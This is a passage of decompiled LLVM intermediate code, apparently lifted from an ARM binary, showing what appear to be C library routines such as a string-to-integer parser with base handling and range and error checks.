  %v2_13f08 = inttoptr i32 %v1_13f08 to i8*
  %v3_13f08 = load i8, i8* %v2_13f08, align 1
  %v4_13f08 = sext i8 %v3_13f08 to i32
  %v2_13f0c = ptrtoint i32* %stack_var_-44 to i32
  %v0_13f10 = load i32, i32* %r6.global-to-local, align 4
  %v4_13f10 = mul nsw i32 %v4_13f08, 4
  %v5_13f10 = add i32 %v0_13f10, %v4_13f10
  %v1_13f14 = inttoptr i32 %v0_13f08 to i32*
  store i32 %v5_13f10, i32* %v1_13f14, align 4
  %v3_13f14 = add i32 %v0_13f08, 4
  %v4_13f14 = inttoptr i32 %v3_13f14 to i32*
  %v5_13f14 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_13f14, i32* %v4_13f14, align 4
  br label %dec_label_pc_13f20

dec_label_pc_13f1c:                               ; preds = %dec_label_pc_13f20
  %v0_13f24 = load i32, i32* %r5.global-to-local, align 4
  %v2_13f1c = inttoptr i32 %v0_13f24 to i32*
  %v3_13f1c = call i32 @function_13de4(i32* %v2_13f1c, i32 %v2_13f0c)
  br label %dec_label_pc_13f20

dec_label_pc_13f20:                               ; preds = %dec_label_pc_13f00, %dec_label_pc_13f1c
  %v0_13f20 = load i32, i32* @r4, align 4
  %v1_13f20 = add i32 %v0_13f20, -1
  store i32 %v1_13f20, i32* @r4, align 4
  %v6_13f20 = icmp slt i32 %v1_13f20, 0
  br i1 %v6_13f20, label %dec_label_pc_13f30, label %dec_label_pc_13f1c

dec_label_pc_13f30:                               ; preds = %dec_label_pc_13f20, %bb21
  %v2_13f38.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_13f34

dec_label_pc_13f34:                               ; preds = %.dec_label_pc_13f34_crit_edge, %dec_label_pc_13f30
  %v2_13f38 = phi i32 [ %v3_13e74, %.dec_label_pc_13f34_crit_edge ], [ %v2_13f38.pre, %dec_label_pc_13f30 ]
  %v1_13f3c = phi i32 [ -1, %.dec_label_pc_13f34_crit_edge ], [ 0, %dec_label_pc_13f30 ]
  store i32 %v2_13f38, i32* @r4, align 4
  store i32 %v12_13e74, i32* @r7, align 4
  ret i32 %v1_13f3c

; uselistorder directives
  uselistorder i32 %v1_13f20, { 1, 0 }
  uselistorder i32 %v0_13f08, { 1, 0, 2 }
  uselistorder i32 %v0_13ef8, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32 (i32*, i32)* @function_13de4, { 1, 0 }
  uselistorder i32 127773, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13f34, { 1, 0 }
  uselistorder label %dec_label_pc_13f20, { 1, 0 }
  uselistorder label %dec_label_pc_13eec, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_13f40(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13f40:
  %v0_13f40 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13f40, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13f40
  %v2_13f40 = load i32, i32* @r7, align 4
  %v5_13f40 = udiv i32 %v2_13f40, 8
  %v6_13f40 = and i32 %v5_13f40, %arg1
  %v3_13f44 = load i32, i32* @fp, align 4
  %v8_13f44 = shl i32 %v6_13f40, %v3_13f44
  %v9_13f44 = and i32 %v8_13f44, %arg1
  %v2_13f48 = load i32, i32* @sp, align 4
  %v8_13f48 = shl i32 %v2_13f48, %arg3
  %v9_13f48 = and i32 %v8_13f48, %arg2
  call void @__pseudo_branch(i32 %v9_13f48)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13f40, %bb
  %v10_13f48 = phi i32 [ %arg1, %dec_label_pc_13f40 ], [ %v9_13f44, %bb ]
  ret i32 %v10_13f48

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_13f4c(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13f4c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_13f4c = load i32, i32* @r4, align 4
  %v6_13f4c = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_13f7c, label %dec_label_pc_13f6c

dec_label_pc_13f6c:                               ; preds = %dec_label_pc_13f4c
  %v2_13f6c = icmp ugt i32 %arg2, 254
  %v7_13f6c = icmp eq i32 %arg2, 255
  %v2_13f70 = xor i1 %v7_13f6c, true
  %v3_13f70 = and i1 %v2_13f6c, %v2_13f70
  br i1 %v3_13f70, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_13f6c
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_13f6c, %bb
  %v1_13fa87 = phi i32 [ %v3_13f4c, %dec_label_pc_13f6c ], [ 4, %bb ]
  %v2_13f74 = xor i1 %v2_13f6c, true
  %v3_13f74 = or i1 %v7_13f6c, %v2_13f74
  br i1 %v3_13f74, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_13f7c:                               ; preds = %dec_label_pc_13f4c
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_13f94, label %dec_label_pc_13f84

dec_label_pc_13f84:                               ; preds = %dec_label_pc_13f7c
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_14004

.thread10:                                        ; preds = %dec_label_pc_13f84
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_13f94:                               ; preds = %dec_label_pc_13f7c
  %v2_13f94 = icmp ugt i32 %arg2, 62
  %v7_13f94 = icmp eq i32 %arg2, 63
  %v2_13f98 = xor i1 %v7_13f94, true
  %v3_13f98 = and i1 %v2_13f94, %v2_13f98
  br i1 %v3_13f98, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_13f94
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_13f94, %bb23
  %v1_13fa86 = phi i32 [ %v3_13f4c, %dec_label_pc_13f94 ], [ 2, %bb23 ]
  %v2_13f9c = xor i1 %v2_13f94, true
  %v3_13f9c = or i1 %v7_13f94, %v2_13f9c
  br i1 %v3_13f9c, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_13fb4 = phi i32 [ 3, %bb22 ], [ %v1_13fa87, %bb21 ], [ %v1_13fa86, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_1b288.325 to i32), i32* %r3.global-to-local, align 4
  %v4_13fa8 = mul i32 %v1_13fb4, 4
  %v5_13fa8 = add i32 %v4_13fa8, ptrtoint (i32* @global_var_1b288.325 to i32)
  store i32 %v5_13fa8, i32* %r2.global-to-local, align 4
  %v1_13fac = add i32 %v4_13fa8, add (i32 ptrtoint (i32* @global_var_1b288.325 to i32), i32 20)
  %v2_13fac = inttoptr i32 %v1_13fac to i32*
  %v3_13fac = load i32, i32* %v2_13fac, align 4
  store i32 %v3_13fac, i32* %r1.global-to-local, align 4
  %v1_13fb0 = add i32 %tmp, 4
  store i32 %v1_13fb0, i32* @r6, align 4
  %v6_13fb4 = inttoptr i32 %v5_13fa8 to i32*
  %v7_13fb4 = load i32, i32* %v6_13fb4, align 4
  store i32 %v7_13fb4, i32* %r2.global-to-local, align 4
  %v4_13fb8 = mul i32 %v3_13fac, 4
  %v5_13fb8 = add i32 %v4_13fb8, %v1_13fb0
  store i32 %v5_13fb8, i32* %r3.global-to-local, align 4
  %v2_13fbc = add i32 %arg3, 16
  %v3_13fbc = inttoptr i32 %v2_13fbc to i32*
  store i32 %v5_13fb8, i32* %v3_13fbc, align 4
  %v0_13fc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_13fc0 = trunc i32 %v0_13fc0 to i8
  %v2_13fc0 = load i32, i32* @r5, align 4
  %v3_13fc0 = add i32 %v2_13fc0, 14
  %v4_13fc0 = inttoptr i32 %v3_13fc0 to i8*
  store i8 %v1_13fc0, i8* %v4_13fc0, align 1
  %v0_13fc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13fc4 = trunc i32 %v0_13fc4 to i8
  %v2_13fc4 = load i32, i32* @r5, align 4
  %v3_13fc4 = add i32 %v2_13fc4, 13
  %v4_13fc4 = inttoptr i32 %v3_13fc4 to i8*
  store i8 %v1_13fc4, i8* %v4_13fc4, align 1
  %v0_13fc8 = load i32, i32* @r4, align 4
  %v1_13fc8 = trunc i32 %v0_13fc8 to i8
  %v2_13fc8 = load i32, i32* @r5, align 4
  %v3_13fc8 = add i32 %v2_13fc8, 12
  %v4_13fc8 = inttoptr i32 %v3_13fc8 to i8*
  store i8 %v1_13fc8, i8* %v4_13fc8, align 1
  %v0_13fcc = load i32, i32* @r6, align 4
  %v1_13fcc = load i32, i32* @r5, align 4
  %v2_13fcc = add i32 %v1_13fcc, 8
  %v3_13fcc = inttoptr i32 %v2_13fcc to i32*
  store i32 %v0_13fcc, i32* %v3_13fcc, align 4
  %v0_13fd0 = load i32, i32* @r5, align 4
  store i32 %v0_13fd0, i32* %r1.global-to-local, align 4
  %v0_13fd4 = load i32, i32* @r0, align 4
  %v2_13fd4 = inttoptr i32 %v0_13fd4 to i32*
  %v3_13fd4 = call i32 @function_13e74(i32* %v2_13fd4, i32 %v0_13fd0)
  store i32 %v3_13fd4, i32* %r0.global-to-local, align 4
  %v0_13fd8 = load i32, i32* @r4, align 4
  %v2_13fd8 = icmp eq i32 %v0_13fd8, 0
  br i1 %v2_13fd8, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_13ff412 = load i32, i32* @r7, align 4
  %v2_13ff413 = inttoptr i32 %v1_13ff412 to i32*
  store i32 0, i32* %v2_13ff413, align 4
  %v1_13ff8 = load i32, i32* @r4, align 4
  store i32 %v1_13ff8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1401c

.thread4:                                         ; preds = %bb26
  %v1_13fdc = load i32, i32* @r5, align 4
  %v2_13fdc = add i32 %v1_13fdc, 4
  %v3_13fdc = inttoptr i32 %v2_13fdc to i32*
  %v4_13fdc = load i32, i32* %v3_13fdc, align 4
  %v1_13fe0 = load i32, i32* @r6, align 4
  %v3_13fe0 = sub i32 %v4_13fdc, %v1_13fe0
  %v4_13fe4 = sdiv i32 %v3_13fe0, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_13fec = mul i32 %v4_13fe4, 5
  %v5_13fec = add i32 %v4_13fec, %v0_13fd8
  store i32 %v5_13fec, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13ff4 = load i32, i32* @r7, align 4
  %v2_13ff4 = inttoptr i32 %v1_13ff4 to i32*
  store i32 0, i32* %v2_13ff4, align 4
  %v1_13ffc = load i32, i32* %r3.global-to-local, align 4
  %v2_13ffc = load i32, i32* @r7, align 4
  %v3_13ffc = inttoptr i32 %v2_13ffc to i32*
  store i32 %v1_13ffc, i32* %v3_13ffc, align 4
  %v1_14024.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1401c

dec_label_pc_14004:                               ; preds = %dec_label_pc_13f84
  %v0_14004 = call i32 @function_1095c()
  store i32 %v0_14004, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_1400c = inttoptr i32 %v0_14004 to i32*
  store i32 22, i32* %v2_1400c, align 4
  %v0_14010 = call i32 @function_1095c()
  %v0_14014 = load i32, i32* %r4.global-to-local, align 4
  %v2_14014 = inttoptr i32 %v0_14010 to i32*
  store i32 %v0_14014, i32* %v2_14014, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1401c

dec_label_pc_1401c:                               ; preds = %bb27, %.thread4, %dec_label_pc_14004
  %v1_14024 = phi i32 [ %v1_14024.pre, %.thread4 ], [ %v1_13ff8, %bb27 ], [ -1, %dec_label_pc_14004 ]
  store i32 %v3_13f4c, i32* @r4, align 4
  store i32 %v6_13f4c, i32* @r5, align 4
  ret i32 %v1_14024

; uselistorder directives
  uselistorder i1 %v7_13f94, { 1, 0 }
  uselistorder i1 %v7_13f6c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1b288.325 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_1401c, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_14030(i32 %arg1) local_unnamed_addr {
dec_label_pc_14030:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_14040 = call i32 @function_14050()
  ret i32 %v0_14040
}

define i32 @function_14050() local_unnamed_addr {
dec_label_pc_14050:
  store i32 1, i32* @r3, align 4
  %v0_1405c = call i32 @function_1406c()
  ret i32 %v0_1405c
}

define i32 @function_1406c() local_unnamed_addr {
dec_label_pc_1406c:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v3_1406c = load i32, i32* @r4, align 4
  %v12_1406c = load i32, i32* @r7, align 4
  store i32 216, i32* @lr, align 4
  store i32 144312, i32* %ip.global-to-local, align 4
  %v0_14080 = load i32, i32* @r1, align 4
  store i32 %v0_14080, i32* %fp.global-to-local, align 4
  %v0_14084 = load i32, i32* @r2, align 4
  store i32 %v0_14084, i32* %r5.global-to-local, align 4
  %v0_14088 = load i32, i32* @r0, align 4
  store i32 %v0_14088, i32* @r4, align 4
  %v0_1408c = load i32, i32* @r3, align 4
  br label %dec_label_pc_14098

dec_label_pc_14094:                               ; preds = %dec_label_pc_14098
  %v1_14094 = add i32 %v0_140d0, 1
  store i32 %v1_14094, i32* @r4, align 4
  br label %dec_label_pc_14098

dec_label_pc_14098:                               ; preds = %dec_label_pc_1406c, %dec_label_pc_14094
  %v0_140d0 = phi i32 [ %v0_14088, %dec_label_pc_1406c ], [ %v1_14094, %dec_label_pc_14094 ]
  %v1_14098 = inttoptr i32 %v0_140d0 to i8*
  %v2_14098 = load i8, i8* %v1_14098, align 1
  %v3_14098 = zext i8 %v2_14098 to i32
  %v4_1409c = load i32, i32* inttoptr (i32 144528 to i32*), align 16
  %v2_140a0 = mul nuw nsw i32 %v3_14098, 2
  %v2_140a4 = add i32 %v2_140a0, %v4_1409c
  %v3_140a4 = inttoptr i32 %v2_140a4 to i16*
  %v4_140a4 = load i16, i16* %v3_140a4, align 2
  %v1_140a8 = and i16 %v4_140a4, 32
  %v2_140a8 = icmp eq i16 %v1_140a8, 0
  br i1 %v2_140a8, label %dec_label_pc_140b0, label %dec_label_pc_14094

dec_label_pc_140b0:                               ; preds = %dec_label_pc_14098
  %v7_140b0 = icmp eq i8 %v2_14098, 43
  br i1 %v7_140b0, label %dec_label_pc_140d0, label %dec_label_pc_140b8

dec_label_pc_140b8:                               ; preds = %dec_label_pc_140b0
  %v7_140b8 = icmp eq i8 %v2_14098, 45
  br i1 %v7_140b8, label %dec_label_pc_140d0, label %bb

bb:                                               ; preds = %dec_label_pc_140b8
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_140d4

dec_label_pc_140d0:                               ; preds = %dec_label_pc_140b0, %dec_label_pc_140b8
  %storemerge39 = phi i32 [ 1, %dec_label_pc_140b8 ], [ 0, %dec_label_pc_140b0 ]
  store i32 %storemerge39, i32* @r7, align 4
  %v1_140d0 = add i32 %v0_140d0, 1
  store i32 %v1_140d0, i32* @r4, align 4
  br label %dec_label_pc_140d4

dec_label_pc_140d4:                               ; preds = %bb, %dec_label_pc_140d0
  %v0_140f4 = phi i32 [ %v0_140d0, %bb ], [ %v1_140d0, %dec_label_pc_140d0 ]
  %v1_140d4 = and i32 %v0_14084, -17
  %v3_140d4 = icmp eq i32 %v1_140d4, 0
  br i1 %v3_140d4, label %dec_label_pc_140e0, label %bb52

bb52:                                             ; preds = %dec_label_pc_140d4
  store i32 %v0_14088, i32* %r6.global-to-local, align 4
  br label %bb56

dec_label_pc_140e0:                               ; preds = %dec_label_pc_140d4
  %v1_140e0 = inttoptr i32 %v0_140f4 to i8*
  %v2_140e0 = load i8, i8* %v1_140e0, align 1
  %v7_140e4 = icmp eq i8 %v2_140e0, 48
  %v1_140e8 = add i32 %v0_14084, 10
  store i32 %v1_140e8, i32* %r5.global-to-local, align 4
  br i1 %v7_140e4, label %dec_label_pc_140f4, label %bb53

bb53:                                             ; preds = %dec_label_pc_140e0
  store i32 %v0_14088, i32* %r6.global-to-local, align 4
  br label %.thread8

dec_label_pc_140f4:                               ; preds = %dec_label_pc_140e0
  %v1_140f4 = add i32 %v0_140f4, 1
  %v2_140f4 = inttoptr i32 %v1_140f4 to i8*
  %v3_140f4 = load i8, i8* %v2_140f4, align 1
  %v4_140f4 = zext i8 %v3_140f4 to i32
  store i32 %v1_140f4, i32* @r4, align 4
  %v1_140f8 = or i32 %v4_140f4, 32
  %v7_140fc = icmp eq i32 %v1_140f8, 120
  %v1_14100 = add i32 %v0_14084, 8
  store i32 %v1_14100, i32* %r5.global-to-local, align 4
  store i32 %v1_140f4, i32* %r6.global-to-local, align 4
  br i1 %v7_140fc, label %bb54, label %.thread8

bb54:                                             ; preds = %dec_label_pc_140f4
  %v3_1410c = mul i32 %v1_14100, 2
  store i32 %v3_1410c, i32* %r5.global-to-local, align 4
  %v2_14110 = add i32 %v0_140f4, 2
  store i32 %v2_14110, i32* @r4, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_140f4, %bb53, %bb54
  %v0_14114 = phi i32 [ %v1_140e8, %bb53 ], [ %v3_1410c, %bb54 ], [ %v1_14100, %dec_label_pc_140f4 ]
  %v5_14118 = icmp slt i32 %v0_14114, 16
  br i1 %v5_14118, label %bb56, label %bb55

bb55:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %bb52, %.thread8, %bb55
  %v0_14130 = phi i32 [ %v0_14084, %bb52 ], [ %v0_14114, %.thread8 ], [ 16, %bb55 ]
  %v1_1411c = add i32 %v0_14130, -2
  %tmp = icmp ugt i32 %v1_1411c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_1412c

.thread:                                          ; preds = %bb56
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_141d8

dec_label_pc_1412c:                               ; preds = %bb56
  %v2_14134 = call i32 @function_103c8(i32 -1, i32 %v0_14130)
  store i32 -1, i32* @r0, align 4
  %v0_14140 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14140, i32* @r1, align 4
  %v1_14144 = urem i32 %v0_14130, 256
  store i32 %v1_14144, i32* %sl.global-to-local, align 4
  %v0_14148 = call i32 @function_102cc()
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v0_14148, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_14160.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14160

dec_label_pc_1415c:                               ; preds = %bb63, %dec_label_pc_141bc
  %v0_1415c = phi i32 [ %v1_1419c36, %bb63 ], [ %v0_1415c.pre, %dec_label_pc_141bc ]
  store i32 %v0_1415c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14160

dec_label_pc_14160:                               ; preds = %dec_label_pc_1412c, %dec_label_pc_1415c
  %v0_1419c = phi i32 [ %v0_14160.pre, %dec_label_pc_1412c ], [ %v0_1415c, %dec_label_pc_1415c ]
  %v1_14160 = inttoptr i32 %v0_1419c to i8*
  %v2_14160 = load i8, i8* %v1_14160, align 1
  %v3_14160 = zext i8 %v2_14160 to i32
  %v1_14164 = add nsw i32 %v3_14160, -48
  %v1_14168 = urem i32 %v1_14164, 256
  %v1_14170 = or i32 %v3_14160, 32
  %tmp71 = icmp ult i32 %v1_14168, 10
  br i1 %tmp71, label %bb58, label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %dec_label_pc_14160
  %tmp72 = icmp ugt i32 %v1_14170, 96
  br i1 %tmp72, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_14178
  %v1_1417c = add nsw i32 %v1_14170, -87
  %v5_14184 = urem i32 %v1_1417c, 256
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_14160, %dec_label_pc_14178, %bb57
  %v3_141b4 = phi i32 [ %v1_14168, %dec_label_pc_14160 ], [ 40, %dec_label_pc_14178 ], [ %v5_14184, %bb57 ]
  %v1_14188 = load i32, i32* %r5.global-to-local, align 4
  %v6_1418c = icmp slt i32 %v3_141b4, %v1_14188
  br i1 %v6_1418c, label %dec_label_pc_14190, label %dec_label_pc_141d8.loopexit

dec_label_pc_14190:                               ; preds = %bb58
  %v0_14190 = load i32, i32* %ip.global-to-local, align 4
  %v1_14190 = load i32, i32* %r8.global-to-local, align 4
  %v9_14190 = icmp eq i32 %v0_14190, %v1_14190
  br i1 %v9_14190, label %.thread31, label %bb59

.thread31:                                        ; preds = %dec_label_pc_14190
  %v1_1419c32 = add i32 %v0_1419c, 1
  store i32 %v1_1419c32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_141a4

bb59:                                             ; preds = %dec_label_pc_14190
  %v3_14190 = icmp ult i32 %v0_14190, %v1_14190
  %v1_1419c = add i32 %v0_1419c, 1
  store i32 %v1_1419c, i32* %r4.global-to-local, align 4
  br i1 %v3_14190, label %dec_label_pc_141a4, label %dec_label_pc_141bc

dec_label_pc_141a4:                               ; preds = %bb59, %.thread31
  %v1_1419c36 = phi i32 [ %v1_1419c32, %.thread31 ], [ %v1_1419c, %bb59 ]
  %v4_141ac2235 = phi i32 [ 1, %.thread31 ], [ 0, %bb59 ]
  %v1_141a4 = load i32, i32* %sl.global-to-local, align 4
  %v3_141a4 = icmp uge i32 %v3_141b4, %v1_141a4
  %v9_141a4 = icmp eq i32 %v3_141b4, %v1_141a4
  %v2_141a8 = xor i1 %v3_141a4, true
  %v3_141a8 = or i1 %v9_141a4, %v2_141a8
  br i1 %v3_141a8, label %bb60, label %bb61

bb60:                                             ; preds = %dec_label_pc_141a4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_141a4, %bb60
  %v4_141ac = phi i32 [ %v4_141ac2235, %dec_label_pc_141a4 ], [ 0, %bb60 ]
  %v2_141ac = xor i1 %v9_141a4, true
  %v3_141ac = and i1 %v3_141a4, %v2_141ac
  br i1 %v3_141ac, label %bb62, label %thread-pre-split

bb62:                                             ; preds = %bb61
  %v5_141ac = urem i32 %v4_141ac, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb61, %bb62
  %v0_141b0 = phi i32 [ %v5_141ac, %bb62 ], [ %v4_141ac, %bb61 ]
  %v2_141b0 = icmp eq i32 %v0_141b0, 0
  br i1 %v2_141b0, label %bb63, label %dec_label_pc_141bc

bb63:                                             ; preds = %thread-pre-split
  %v4_141b4 = mul i32 %v0_14190, %v1_14188
  %v5_141b4 = add i32 %v4_141b4, %v3_141b4
  store i32 %v5_141b4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1415c

dec_label_pc_141bc:                               ; preds = %bb59, %thread-pre-split
  %v0_141bc = call i32 @function_1095c()
  %v0_141c4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_141c4, i32* %ip.global-to-local, align 4
  %v0_141c8 = load i32, i32* @r7, align 4
  %v2_141c8 = and i32 %v0_141c8, %v0_1408c
  store i32 %v2_141c8, i32* @r7, align 4
  %v2_141d0 = inttoptr i32 %v0_141bc to i32*
  store i32 34, i32* %v2_141d0, align 4
  %v0_1415c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1415c

dec_label_pc_141d8.loopexit:                      ; preds = %bb58
  %v0_141d8.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_141d8

dec_label_pc_141d8:                               ; preds = %.thread, %dec_label_pc_141d8.loopexit
  %v2_141dc = phi i32 [ %v0_141d8.pre, %dec_label_pc_141d8.loopexit ], [ %v0_14080, %.thread ]
  %v2_141d8 = icmp eq i32 %v2_141dc, 0
  br i1 %v2_141d8, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_141d8
  %v1_141dc = load i32, i32* %r6.global-to-local, align 4
  %v3_141dc = inttoptr i32 %v2_141dc to i32*
  store i32 %v1_141dc, i32* %v3_141dc, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_141d8, %bb64
  %v0_141e4 = load i32, i32* @r7, align 4
  %v2_141e4 = icmp eq i32 %v0_141e4, 0
  %. = select i1 %v2_141e4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_141f0 = icmp eq i32 %v0_1408c, 0
  %v0_14214.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_141f0, label %dec_label_pc_1420c, label %bb68

bb68:                                             ; preds = %bb65
  %tmp73 = icmp ugt i32 %v0_14214.pre.pre, %.
  br i1 %tmp73, label %dec_label_pc_141fc, label %dec_label_pc_1420c

dec_label_pc_141fc:                               ; preds = %bb68
  %v0_141fc = call i32 @function_1095c()
  %v2_14204 = inttoptr i32 %v0_141fc to i32*
  store i32 34, i32* %v2_14204, align 4
  %v0_14208 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14208, i32* %ip.global-to-local, align 4
  %v0_1420c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1420c

dec_label_pc_1420c:                               ; preds = %bb68, %bb65, %dec_label_pc_141fc
  %v0_14214.pre = phi i32 [ %v0_14214.pre.pre, %bb68 ], [ %v0_14208, %dec_label_pc_141fc ], [ %v0_14214.pre.pre, %bb65 ]
  %v0_1420c = phi i32 [ %v0_141e4, %bb68 ], [ %v0_1420c.pre, %dec_label_pc_141fc ], [ %v0_141e4, %bb65 ]
  %v2_1420c = icmp eq i32 %v0_1420c, 0
  br i1 %v2_1420c, label %dec_label_pc_1420c._crit_edge, label %bb69

bb69:                                             ; preds = %dec_label_pc_1420c
  %v2_14210 = sub i32 0, %v0_14214.pre
  store i32 %v2_14210, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1420c._crit_edge

dec_label_pc_1420c._crit_edge:                    ; preds = %dec_label_pc_1420c, %bb69
  %v0_14214 = phi i32 [ %v2_14210, %bb69 ], [ %v0_14214.pre, %dec_label_pc_1420c ]
  store i32 %v3_1406c, i32* @r4, align 4
  store i32 %v12_1406c, i32* @r7, align 4
  ret i32 %v0_14214

; uselistorder directives
  uselistorder i32 %v0_14214.pre, { 1, 0 }
  uselistorder i32 %v0_14214.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_141ac, { 1, 0 }
  uselistorder i1 %v3_141a4, { 1, 0 }
  uselistorder i32 %v1_141a4, { 1, 0 }
  uselistorder i32 %v1_14170, { 1, 0 }
  uselistorder i32 %v1_14168, { 1, 0 }
  uselistorder i32 %v0_1419c, { 1, 0, 2 }
  uselistorder i32 %v0_1415c, { 1, 0 }
  uselistorder i32 %v3_1410c, { 1, 0 }
  uselistorder i32 %v1_14100, { 1, 0, 2 }
  uselistorder i32 %v0_140d0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1408c, { 1, 0 }
  uselistorder i32 %v0_14084, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 2, 3, 0, 5, 7, 4, 8, 6, 1 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder label %dec_label_pc_1420c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1420c, { 2, 0, 1 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_141d8, { 1, 0 }
  uselistorder label %dec_label_pc_141bc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14160, { 1, 0 }
  uselistorder label %dec_label_pc_1415c, { 1, 0 }
  uselistorder label %bb56, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140d4, { 1, 0 }
  uselistorder label %dec_label_pc_140d0, { 1, 0 }
